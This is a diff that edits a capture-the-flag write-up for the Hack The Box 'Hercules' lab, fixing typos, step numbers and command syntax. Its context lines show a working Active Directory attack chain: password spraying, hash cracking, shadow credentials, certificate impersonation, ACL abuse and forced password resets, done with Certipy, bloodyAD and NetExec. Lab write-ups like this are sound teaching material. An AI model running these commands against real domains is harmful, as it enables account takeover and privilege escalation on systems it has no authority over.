@@ -35,7 +35,7 @@ Starting with a full port scan reveals a number of TCP ports:
 └─$ nmap -sC -sV -p- --min-rate 10000 10.10.11.91
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-22 17:11 UTC
-Nmap scan report for hercules.htb (10.10.10.91)
+Nmap scan report for hercules.htb (10.10.11.91)
 Host is up (0.10s latency).
 Not shown: 65512 closed ports
 PORT      STATE    SERVICE        VERSION / NOTES
@@ -158,7 +158,7 @@ johnathan.j : change*[REDACTED]
 
 The password contains special characters `*`, `(`, `)`, `!` which must be properly escaped in LDAP filters using hex encoding (`\\2a` for `*`, etc.). The concurrent approach tests 15 characters simultaneously, drastically reducing extraction time from hours to minutes.
 
-> Trying to validate this password with `johnathan.j` using NetExec, but we got `KDC_ERR_PREAUTH_FAILED`, which means that this password isn’t valid for this specefic user
+> Trying to validate this password with `johnathan.j` using NetExec, but we got `KDC_ERR_PREAUTH_FAILED`, which means that this password isn’t valid for this specific user
 {: .prompt-warning }
 
 #### Password Spray
@@ -184,7 +184,7 @@ As a result, the extracted password from `johnathan.j`'s description field is b
 
 
 ### Web Application Exploitation
-After authenticating as `ken.w`, we find in the `Mail` section that this user has 3 emails. After reviewing them all we catch an interesting emial titled `Site Maintenance`:
+After authenticating as `ken.w`, we find in the `Mail` section that this user has 3 emails. After reviewing them all we catch an interesting email titled `Site Maintenance`:
 ![1](/assets/img/favicons/hercules-htb/web3.png)
 
 With a potential username in hand that we hadn’t validated at the domain level previously, the next step is to verify whether `web_admin` actually exists or not. We can do this step using **NetExec** against LDAP with Kerberos authentication `-k` and an empty password `''`; not to log in but to observe how the KDC responds.
@@ -363,7 +363,7 @@ With `web_admin` privileges we gained access to the earlier file upload functi
 5) Cracked:
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Hercules]
-└─$ john natalei.hash -w=/usr/share/wordlists/rockyou.txt 
+└─$ john natalie.hash -w=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
@@ -459,7 +459,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 > The attribute was designed to store public keys for **Kerberos PKINIT** authentication, which uses asymmetric cryptography instead of traditional passwords. An attacker with `WriteProperty`, `GenericWrite`, or `GenericAll` over this attribute can hijack that mechanism by injecting their own public key into the target account, then authenticating with the matching private key — walking away with a valid **TGT** and full impersonation of the account.
 {: .prompt-info}
 
-#### Step 3: Active Directory Enumeration
+#### Step 2: Active Directory Enumeration
 
 Using **bloodyAD** as `natalie.a` and `bob.w`, we can check which attributes we have `WRITE` capability over on different domain objects. While viewing the output, we caught up that:
 
@@ -502,7 +502,7 @@ We want to move an object from an **OU** that we have low privileges on, to anot
 ![image](/assets/img/favicons/hercules-htb/rSWWdyM7bN.png)
 
 
-#### Step 4: Strategic Object Relocation
+#### Step 3: Strategic Object Relocation
 
 **Enumerate domain with PowerView as bob.w:**
 ```bash
@@ -529,7 +529,7 @@ We want to move an object from an **OU** that we have low privileges on, to anot
 ```
 ![image](/assets/img/favicons/hercules-htb/vmware_Ceky9sm7zo.png)
 
-#### Step 5: Certificate Abuse
+#### Step 4: Certificate Abuse
 
 **Perform shadow credentials attack:**
 
@@ -559,7 +559,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'stephen.m':[HASH_REDACTED]
 ```
 
-#### Step 6: Privilege Escalation Chain
+#### Step 5: Privilege Escalation Chain
 
 With `stephen.m` compromised, we run BloodHound to map out what we can reach from here.
 
@@ -590,7 +590,7 @@ Starting with `auditor`:
 └─$ KRB5CCNAME=./stephen.m.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'AUDITOR' 'Prettyprincess'
 [+] Password changed successfully!
 
-# diserved the password tbh ;)
+# deserved the password tbh ;)
 ```
 
 Access WinRM as `auditor`:
@@ -634,15 +634,17 @@ The reason `ashley.b` is our target of choice here is her `REMOTE MANAGEMENT USE
 
 #### Step 1 - OU Takeover
 
+Takeover the **`FOREST MIGRATION`** OU:
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Hercules]
 └─$ KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'auditor'
 [+] auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
 ```
 
+Refresh the TGT with new gained privileges:
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Hercules]
-└─$ KRB5CCNAME=./stephen.m.ccache nxc smb dc.hercules.htb -k -u 'AUDITOR' -p 'Prettyprincess' --generate-tgt auditor
+└─$ nxc smb dc.hercules.htb -k -u 'AUDITOR' -p 'Prettyprincess' --generate-tgt auditor
 SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         dc.hercules.htb 445    dc               [+] hercules.htb\AUDITOR:Prettyprincess 
 SMB         dc.hercules.htb 445    dc               [+] TGT saved to: auditor.ccache
@@ -718,7 +720,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 2) Use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of other another user
 
 ```bash
-****┌──(kali㉿kali)-[~/HTB/Hercules]
+┌──(kali㉿kali)-[~/HTB/Hercules]
 └─$ KRB5CCNAME=./fernando.r.ccache certipy req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip $ip -ca 'CA-HERCULES' -template 'User' -application-policies 'Client Authentication' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
@@ -731,7 +733,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'ashley.b.pfx'
 ```
 
-3) Authenticate as the imporsanated user
+3) Authenticate as the impersonated user
 
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Hercules]
@@ -763,7 +765,7 @@ SMB         dc.hercules.htb 445    dc               [+] TGT saved to: ashley.b.c
 SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=ashley.b.ccache
 
 ┌──(kali㉿kali)-[~/HTB/Hercules]
-└─$ KRB5CCNAME=./ashley.b.ccacheevil-winrm-py -i hercules.htb -k --no-pass --ssl 
+└─$ KRB5CCNAME=./ashley.b.ccache evil-winrm-py -i hercules.htb -k --no-pass --ssl 
           _ _            _                             
   _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
  / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
